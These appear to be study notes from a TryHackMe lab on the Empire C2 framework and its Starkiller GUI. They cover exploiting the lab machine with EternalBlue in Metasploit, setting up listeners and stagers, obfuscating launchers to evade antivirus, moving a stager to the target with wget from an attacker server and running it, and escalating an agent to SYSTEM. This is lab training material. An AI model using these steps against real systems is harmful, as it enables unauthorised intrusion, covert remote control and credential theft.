Empire, a C2 or Command and Control server created by BC-Security, used to deploy agents onto a device and remotely run modules. Empire is a free and open-source alternative to other command and control servers like the well known Cobalt Strike C2. In this room, we will cover the basics of setting up a listener and stager as well as what types are available, then learn how to use an agent on a device.

---

Before we can move on to using Empire we need to deploy a machine to connect the Empire server with.  

Deploy this machine and discover what exploit this machine is vulnerable to. The virtual machine used in this room (Blue) can be downloaded for offline usage from [https://darkstar7471.com/resources.html](https://darkstar7471.com/resources.html)

_We recommend completing the room '[Blue](https://tryhackme.com/room/blue)' prior to this room for this purpose alone._

Vulnerable to eternal blue.

nmap
```php
nmap -sV -sC -T4 -Pn $IP
```

I confirm that it's vulnerable using script scan with nmap:

```php
nmap -sV -script=safe -T4 -p445  $IP
```

```php
State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
```

msfconsole

```php
msfconsole
```

```php
search eternalblue
```

```php
use 0
```

```php
set options
```
- add 
	- target ip
	- attacker ip
```php
set lhost tun0
set rhost <TARGET>
run
```

_It might take a few tries so run it again if it doesn't work the first time._

---

**Already installed on Kali**

The installation for Empire and Starkiller very easy and can all be done from the command line. The choice is up to you on whether or not you want to use the GUI for Empire, the room itself will showcase Starkiller but all functionalities are the same. For further instructions on installing Empire refer to the [BC-Security Github](https://github.com/BC-SECURITY/Empire).

Installing Empire

We can begin by installing Empire on our device. Follow the instructions below to install Empire.

1. `cd /opt`

2. `git clone https://github.com/BC-SECURITY/Empire/`

```php
git clone --recursive https://github.com/BC-SECURITY/Empire.git
```

3. `cd /opt/Empire`

4. `./setup/install.sh`

  
Installing Starkiller

Once Empire is installed we can install the GUI for Empire known as Starkiller.

1. `cd /opt`

2. Download an up to date version of Starkiller from the BC-Security Github repo - [https://github.com/BC-SECURITY/Starkiller/releases](https://github.com/BC-SECURITY/Starkiller/releases) 

3. `chmod +x starkiller-0.0.0.AppImage`

  
Starting Empire

Once both Empire and Starkiller are installed we can start both servers. Being by starting Empire with the instructions below.  

1. `cd /opt/Empire`

2. `./empire --rest`

  
Starting Starkiller  

Once Empire is started follow the instructions below to start Starkiller.  

1. `cd /opt`

2. `./starkiller-0.0.0.AppImage`  

3. Login to Starkiller

Default Credentials

`Uri: 127.0.0.1:1337`

`User: empireadmin`

`Pass: password123`

Once you have logged into Starkiller you should be greeted with the Listeners menu, once you have Starkiller or Empire ready move on to Task 3 to get familiar with the menu.

---

SQL management

- Empire has a duplicate sql entry so i need to delete it before continuing. This could gave been caused when i re-downloaded empire and installed it. 

List tcp connections
```php
ss --numeric --listening --tcp
```

Start server
```php
sudo service mysql start
```

Login
```php
sudo mysql -u root -p
```

List databases 
```php
show databases;
```
Other commands:
- use
- create

Delete database
```php
DROP DATABASE <DATABASE>;
```

Start Empire sever
```php
sudo powershell-empire server
```

Start Empire client
```php
sudo powershell-empire client
```

Listeners 
```php
uselistener <TYPE>
```
- http
- dbx

Customise 
```php
set Name MyListener
set port 80
execute
options
back
listeners
```

Stagers
```php
usestager
```

Rename
```php
set Listener MyListener
set obfuscate True
execute
options
```
- obfuscate the PowerShell launcher code to evade network detection by setting `Obfuscate True`

Agents

- Your _Listener_ and _Stager_ are now created. The final step is to execute the _Stager_ you created on the target system. This will generate a new _Agent_ once it connects back to the Empire Server, which allows you to control the target machine remotely.

- First, transfer the _Stager_ you created to the target machine. PowerShell Empire will tell you where this _Stager_ was written to when you ran the `execute` command. When you have transferred this _Stager_ to your target machine, run it.

- Back in PowerShell Empire, type agents to see a list of active _Agents_.

```php
agents
```

Rename
```php
rename H97R1ZN8 MyAgent
```


Modules

To perform actions against the target machine, you need to use PowerShell Empire’s _Modules_. Each _Module_ performs a specific function, such as collecting browser data, dumping passwords, exploiting local vulnerabilities, establishing persistence, performing reconnaissance, and moving laterally.

PowerShell Empire has over 400 modules for you to use, written in PowerShell, Python, and C#. Let’s take a look at some popular ones.

Privilege Escalation

This time, execute the _Stager_ you created as Administrator to get an _Agent_ running with elevated privileges. Elevated _Agents_ will have an `*` next to them in PowerShell Empire when listed.

Now use the `powershell_privesc_getsystem` module by running the command `usemodule powershell_privesc_getsystem`.

This module lets you elevate admin privileges to SYSTEM privileges, which lets you dump credentials, steal Kerberos tokens, and perform lateral movement. You need to set the _Agent_ you want to execute this module through using the command `set Agent 7B3ZS8Y9`. Then, type `execute` to run the module. You must use the Agent’s ID to set it, not its name.

To see if the module was successful, type `interact 7B3SZS8Y9`

https://www.stationx.net/how-to-use-powershell-empire/

# Starkiller

```php
starkiller 
```
- https://localhost:1337
- Username: empireadmin
- Pass: password123

---

Now that we have Empire and Starkiller installed and running we can take a brief tour of the GUI to see some of the main features Empire has to offer. You will notice six different main tabs that you will interact with the most each one is outlined below.

- Listeners - Similar to Netcat or multi/handler for receiving back stagers.
- Stagers - Similar to a payload with further functionality for deploying agents.
- Agents - Used to interact with agents on the device to perform "tasks". 
- Modules - Modules that can be used as tools or exploits.
- Credentials - Reports all credentials found when using modules.
- Reporting - A report of every module and command run on each agent.
 

![](https://i1.wp.com/www.bc-security.org/wp-content/uploads/2020/04/starkiller.png?fit=853%2C766&ssl=1)  

  
## Listeners

The first menu you will see is a listeners menu. This menu will allow you to create and list what listeners you have available. Listeners will listen on a specific port similar to Netcat or multi handler.
  

![](https://i.imgur.com/eeVpIqw.png)  

## Stagers

Stagers will be the second point to getting an agent to connect back to your C2 server. This menu similar to the listener menu will allow you to create and list what stagers you have available. Stagers will send off an agent similar to a payload.


![](https://i.imgur.com/n2fVNjl.png)  

  
## Agents 

Agents will be where you do a majority of interaction in Starkiller. This menu will allow you to see an overview of all agents and interact with specific agents. Agents are like shells back to the device, you can send shell commands and modules from agents.


![](https://i.imgur.com/hCTv25j.png)  

  
## Modules

The Modules menu will give you an overview of all modules available and allow you to search for a particular module. Modules are specific tools and exploits that can be used with agents like enumeration scripts, privilege escalation methods, and exploits.


![](https://i.imgur.com/4oLcQVc.png)  

  
## Credentials

The Credentials menu is a very useful menu in Starkiller that will save any enumerated credentials found from a device or module. It can either save hashes or plaintext passes; you can also manually add any credentials it does not auto collect.


![](https://i.imgur.com/N6vm1lQ.png)  
## Reporting 

The Reporting menu is another useful menu that allows you to see shell commands or modules that you have run in the past and report them to this menu, making it great for looking back at your work.


![](https://i.imgur.com/jO2b8Yr.png)  

---

# Listeners Overview

﻿Listeners are used in Empire similar to how they are used in any other normal listener like Netcat and multi/handler. These listeners can have some very useful functionality that can help with agent management as well as concealing your traffic / evading detections. Below you can find an outline of the available listeners and their uses.

- http - This is the standard listener that utilizes HTTP to listen on a specific port.

The next four commands use variations of HTTP COMs to generate a listener, this is out of scope for this room; however, I encourage you to do your own research on HTTP COMs and how they can be used to conceal traffic.

- http_com - Uses the standard HTTP listener with an IE COM object.
- http_foreign - Used to point to a different Empire server.
- http_hop - Used for creating an external redirector using PHP.
- http_mapi - Uses the standard HTTP listener with a MAPI COM object.

The next five commands all use variations of built out services or have unique features that make them different from other listeners.

- meterpreter -  Used to listen for Metasploit stagers.
- onedrive - Utilizes OneDrive as the listening platform.
- redirector - Used for creating pivots in a network.
- dbx - Utilizes Dropbox as the listening platform.
- http_malleable - Used alongside the malleable C2 profiles from BC-Security.

There is also the ability to create custom malleable c2 listeners that act as beacons to emulate certain threats or APTs however that is out of scope for this room. For more information refer to the [BC-Security blog](https://www.bc-security.org/post/empire-malleable-c2-profiles/).

For the purposes of this room, we will be utilizing the HTTP listener.

## Creating a Listener

1. Navigate to the listeners tab and select 'CREATE LISTENER'

![](https://assets.tryhackme.com/additional/empire/listener1.png)  

  
2. Select your listener type, for the demo, we'll use an HTTP listener.

![](https://assets.tryhackme.com/additional/empire/listener2.png)  

  
3. Configure your listener, the only two options you will need to change are the host IP and the host port.

![](https://assets.tryhackme.com/additional/empire/listener3.png)

The menu for creating a listener gives us many options to choose from. These option fields will change from listener to listener. Below is an outline of each field present for the HTTP listener and how they can be used and adjusted.

- Name - Specify what name the listener shows up as in the listener menu.
- Host - IP to connect back to.
- Port - Port to listen on.
- BindIP - IP to bind to (typically localhost / 0.0.0.0)

These options can be used for specifying how the listener operates and runs when started and while running.

- DefaultDelay
- DefaultJitter
- DefaultLostLimit

The following options can be useful for bypassing detection techniques and creating more complex listeners.

- DefaultProfile - Will allow you to specify the profile used or User-Agent.
- Headers - Since this is an HTTP listener it will specify HTTP headers.
- Launcher - What launcher to use for the listener this will be prefixed on the stager.
 
4. After pressing submit, we now have an active listener on port 4444.

![](https://assets.tryhackme.com/additional/empire/listener4.png)  


---

# Stagers Overview

Starkiller uses a listener and a stager to create an agent the listener does exactly as it sounds like it, it listens on a given port for a connection back from your agent. The stager is similar to a payload or reverse-shell that you would send to the target to get an agent back. There is a large number of stagers available we will only cover a handful of the stagers and their uses then use two to demonstrate their uses. Below is an outline of a handful from the possible list of stagers to choose from.

Empire has multiple parts to each stage to help identify each one. First is the platform this can include multi, OSx, and Windows. Second the stager type itself / launcher.

Below are 3 stagers that are general purpose and can be used as your basic stagers. multi/launcher is the most all-purpose stager and can be used for a variety of scenarios, this is the stager we will use for demo purposes in this room.

- multi/launcher - A fairly universal stager that can be used for a variety of devices.
- windows/launcher_bat - Windows Batch file
- multi/bash - Basic Bash Stager

You can also use stagers for more specific applications similar to the listeners. These can be anything from macro code to ducky code for USB attacks.

- windows/ducky - Ducky script for the USB Rubber Ducky for physical USB attacks.
- windows/hta - HTA server an HTML application protocol that can be used to evade AV.
- osx/applescript - Stager in AppleScript: Apple's own programming language.
- osx/teensy - Similar to the rubber ducky is a small form factor micro-controller for physical attacks.

Each stager can have its own uses and strengths to it. For this room, we will be using multi/launcher and windows/launcher_bat to continue throughout the room.

## Generating a Stager

1. Go to the stagers tab and select 'GENERATE STAGER'.

![](https://assets.tryhackme.com/additional/empire/stager1.png)  

2. Select your stager type, for our demo, we’ll use windows/launcher_bat.

![](https://assets.tryhackme.com/additional/empire/stager2.png)

3. Set the listener to the one you made in the previous task.

![](https://assets.tryhackme.com/additional/empire/stager3.png)  

The menu for creating a stager does not have many options but can allow you to customize each stager to your liking, with the listener of your choosing. The stager menu can come with various options depending on the stager selected as well as optional fields.

- Listener - Select which listener to use from a list of created listeners on the Empire server.
- Base64 - Enable or disable stager encoding with base64.
- Language - Language used to create the stager: bash, PowerShell, Python, etc.
- SafeChecks - Enable or disable checks for the stager.

I encourage you to explore more of the optional fields; however, these are out of scope for this room. Some of the optional fields include ASMIBypass, Obfuscate, ETWBypass, etc.

  

4. We now have a stager ready to deploy to our target depending on the stager type you selected you will have to either download or copy and paste the stager to the target machine.

![](https://assets.tryhackme.com/additional/empire/stager4.png)

Transferring & Executing the Stager

## Attacking Machine:

There are many ways that you can send the stager to the target machine, including SCP, phishing, and malware droppers; for this example, we will use a basic python3 server and wget to transfer the stager.

1. `python3 -m http.server`

Target Machine:

1. `wget TUN0_IP:8000/launcher.bat -outfile launcher.bat`

2.) `./launcher.bat`

  

![](https://i.imgur.com/xRfiQiS.png)

Below is what the multi/launcher PowerShell payload will look like with the _powershell -noP -sta -w 1 -enc_ launcher that we provided when creating the listener. The launcher will take the encoded payload and decode then run it, in this case, the payload will still get picked up by AV however you can adjust the launching and obfuscation commands to bypass AV or other detections.

![](https://i.imgur.com/XBa35J3.png)

  
After executing the stager, if you correctly set up both the stager and listener then an agent will check back in the agents tab.

Answer the questions below

Read the above and create a basic multi/launcher stager using the HTTP listener you created in Task 5

Execute the stager on the device you deployed in Task 2

Upload file
```php
upload /tmp/launcher.bat c:/windows/temp/launcher.bat
```

Execute file
```php
execute -f launcher.bat
```


